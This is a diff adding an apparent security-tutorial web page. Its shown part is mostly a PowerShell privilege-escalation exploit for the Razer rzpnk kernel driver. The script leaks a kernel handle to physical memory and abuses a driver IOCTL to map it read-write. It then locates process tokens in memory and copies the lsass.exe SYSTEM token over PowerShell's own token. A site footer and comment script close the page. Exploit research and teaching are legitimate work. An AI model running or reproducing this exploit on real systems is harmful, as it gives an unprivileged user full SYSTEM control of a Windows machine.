+				[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
+			}
+			# STATUS_SUCCESS
+			elseif ($CallResult -eq 0x00000000) {
+				break
+			}
+			# Probably: 0xC0000005 -> STATUS_ACCESS_VIOLATION
+			else {
+				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
+				return
+			}
+		}
+		
+		$SYSTEM_HANDLE_INFORMATION = New-Object SYSTEM_HANDLE_INFORMATION
+		$SYSTEM_HANDLE_INFORMATION = $SYSTEM_HANDLE_INFORMATION.GetType()
+		if ([System.IntPtr]::Size -eq 4) {
+			$SYSTEM_HANDLE_INFORMATION_Size = 16 # This makes sense!
+		} else {
+			$SYSTEM_HANDLE_INFORMATION_Size = 24 # This doesn't make sense, should be 20 on x64 but that doesn't work.
+												# Ask no questions, hear no lies!
+		}
+		
+		$BuffOffset = $BuffPtr.ToInt64()
+		$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
+		$BuffOffset = $BuffOffset + [System.IntPtr]::Size
+		
+		$SystemHandleArray = @()
+		for ($i=0; $i -lt $HandleCount; $i++){
+			# PtrToStructure only objects we are targeting, this is expensive computation
+			if ([System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset) -eq $ProcID) {
+				$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
+				$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_HANDLE_INFORMATION)
+				
+				$HashTable = @{
+					PID = $Cast.ProcessID
+					ObjectType = if (!$($TypeSwitches[[int]$Cast.ObjectTypeNumber])) { "0x$('{0:X2}' -f [int]$Cast.ObjectTypeNumber)" } else { $TypeSwitches[[int]$Cast.ObjectTypeNumber] }
+					HandleFlags = $FlagSwitches[[int]$Cast.Flags]
+					Handle = "0x$('{0:X4}' -f [int]$Cast.HandleValue)"
+					KernelPointer = if ([System.IntPtr]::Size -eq 4) { "0x$('{0:X}' -f $Cast.Object_Pointer.ToInt32())" } else { "0x$('{0:X}' -f $Cast.Object_Pointer.ToInt64())" }
+					AccessMask = "0x$('{0:X8}' -f $($Cast.GrantedAccess -band 0xFFFF0000))"
+				}
+				
+				$Object = New-Object PSObject -Property $HashTable
+				$SystemHandleArray += $Object
+				
+			}
+	
+			$BuffOffset = $BuffOffset + $SYSTEM_HANDLE_INFORMATION_Size
+		}
+		
+		if ($($SystemHandleArray.count) -eq 0) {
+			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
+			Return
+		}
+		
+		# Set column order and auto size
+		$SystemHandleArray
+		
+		# Free SYSTEM_HANDLE_INFORMATION array
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
+	}
+
+	#----------------[Get Driver Handle]
+	
+	$hDevice = [Razer]::CreateFile("\\.\47CD78C9-64C3-47C2-B80F-677B887CF095", [System.IO.FileAccess]::ReadWrite,
+	[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+	
+	if ($hDevice -eq -1) {
+		echo "`n[!] Unable to get driver handle..`n"
+		Return
+	} else {
+		echo "`n[>] Driver access OK.."
+		echo "[+] lpFileName: \\.\47CD78C9-64C3-47C2-B80F-677B887CF095 => rzpnk"
+		echo "[+] Handle: $hDevice"
+	}
+	
+	#----------------[Prepare buffer & Send IOCTL]
+	
+	# Get full access process handle to self
+	echo "`n[>] Opening full access handle to PowerShell.."
+	$hPoshProc = [Razer]::OpenProcess(0x001F0FFF,$false,$PID)
+	echo "[+] PowerShell handle: $hPoshProc"
+	
+	# Get Section handle
+	echo "`n[>] Leaking Kernel handle to \Device\PhysicalMemory.."
+	$SystemProcHandles = Get-Handles -ProcID 4
+	[Int]$UserSectionHandle = $(($SystemProcHandles |Where-Object {$_.ObjectType -eq "Section"}).Handle)
+	[Int64]$SystemSectionHandle = $UserSectionHandle + 0xffffffff80000000
+	echo "[+] System section handle: $('{0:X}' -f $SystemSectionHandle)"
+	
+	# NTSTATUS ZwMapViewOfSection(
+	#   _In_        HANDLE          SectionHandle,      | Param 3 - RCX = SectionHandle
+	#   _In_        HANDLE          ProcessHandle,      | Param 1 - RDX = ProcessHandle
+	#   _Inout_     PVOID           *BaseAddress,       | Param 2 - R8  = BaseAddress -> Irrelevant, ptr to NULL
+	#   _In_        ULONG_PTR       ZeroBits,           | 0 -> OK - R9
+	#   _In_        SIZE_T          CommitSize,         | Param 5 - CommitSize / ViewSize
+	#   _Inout_opt_ PLARGE_INTEGER  SectionOffset,      | 0 -> OK
+	#   _Inout_     PSIZE_T         ViewSize,           | Param 5 - CommitSize / ViewSize
+	#   _In_        SECTION_INHERIT InheritDisposition, | 2 = ViewUnmap
+	#   _In_        ULONG           AllocationType,     | 0 -> Undocumented?
+	#   _In_        ULONG           Win32Protect        | 0x40 -> PAGE_READWRITE
+	# );
+	$InBuffer = @(
+		[System.BitConverter]::GetBytes($hPoshProc.ToInt64()) +      # Param 1 - RDX=ProcessHandle
+		[System.BitConverter]::GetBytes([Int64]0x0) +                # Param 2 - BaseAddress -> Irrelevant, ptr to NULL
+		[System.BitConverter]::GetBytes($SystemSectionHandle) +      # Param 3 - RCX=SectionHandle
+		[System.BitConverter]::GetBytes([Int64]4) +                  # Param 4 - ? junk ?
+		[System.BitConverter]::GetBytes([Int64]$(1200*1024*1024)) +  # Param 5 - CommitSize / ViewSize
+		[System.BitConverter]::GetBytes([Int64]4)                    # Param 6 - ? junk ?
+	)
+	
+	# Output buffer
+	$OutBuffer = [Razer]::VirtualAlloc([System.IntPtr]::Zero, 1024, 0x3000, 0x40)
+	
+	# Ptr receiving output byte count
+	$IntRet = 0
+	
+	#=======
+	# 0x22A064 - ZwMapViewOfSection
+	#=======
+	$CallResult = [Razer]::DeviceIoControl($hDevice, 0x22A064, $InBuffer, $InBuffer.Length, $OutBuffer, 1024, [ref]$IntRet, [System.IntPtr]::Zero)
+	if (!$CallResult) {
+		echo "`n[!] DeviceIoControl failed..`n"
+		Return
+	}
+	
+	#----------------[Read out the result buffer]
+	echo "`n[>] Verifying ZwMapViewOfSection.."
+	$NTSTATUS = "{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8+8+8))
+	$Address = [System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8)
+	if ($NTSTATUS -eq 0) {
+		echo "[+] NTSTATUS Success!"
+		echo "[+] 1.2GB RWX \Device\PhysicalMemory allocated at: $('{0:X}' -f $Address)"
+	} else {
+		echo "[!] Call failed: $('{0:X}' -f $NTSTATUS)"
+	}
+
+	#----------------[Parse PhysicalMemory]
+	echo "`n[>] Parsing physical memory, coffee time..`n"
+	
+	# Store PwnCount so we can exit our loop!
+	$PwnCount = 0
+	
+	for ($i=0x30000000;$i -lt $(1200*1024*1024); $i+=0x10) {
+		
+		# Read potential pooltag
+		$Val = [System.Runtime.InteropServices.Marshal]::ReadInt32($Address+$i+4)
+		
+		# If pooltag matches Proc, pull out details..
+		if ($Val -eq 0xe36f7250) {
+		
+			echo "[?] w00t Proc chunk found!"
+			$ProcessName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($Address+$i+0x60+0x2d8+8) # Not sure why +8 here?
+			
+			if ($ProcessName -eq "powershell.exe") {
+				$Token = [System.Runtime.InteropServices.Marshal]::ReadInt64($Address+$i+0x60+0x208)
+				$WriteWhere = $Address+$i+0x60+0x208
+				echo "`n[>] PowerShell poolparty: $('{0:X}' -f $($Address+$i))"
+				echo "[+] Token: $('{0:X}' -f $Token)`n"
+				$PwnCount += 1
+			}
+			
+			if ($ProcessName -eq "lsass.exe") {
+				$Token = [System.Runtime.InteropServices.Marshal]::ReadInt64($Address+$i+0x60+0x208)
+				$WriteWhat = $Token
+				echo "`n[>] LSASS poolparty: $('{0:X}' -f $($Address+$i))"
+				echo "[+] Token: $('{0:X}' -f $Token)`n"
+				$PwnCount += 1
+			}
+			
+			# Check if PwnCount is 2
+			if ($PwnCount -eq 2) {
+				# Overwrite PowerShell token & exit
+				echo "[>] Duplicating SYSTEM token..`n"
+				[System.Runtime.InteropServices.Marshal]::WriteInt64($WriteWhere,$WriteWhat)
+				Break
+			}
+		}
+	}
+}</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/Logic_17.png">
+<p>&nbsp;</p>
+
+</div>
+    </div>
+</div>
+
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../../index.html">Home</a> |
+          <a href="../../tutorials.html">Tutorials</a> |
+          <a href="../../coding.html">Scripting</a> |
+          <a href="../../exploits.html">Exploits</a> |
+          <a href="../../links.html">Links</a> |
+          <a href="../../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
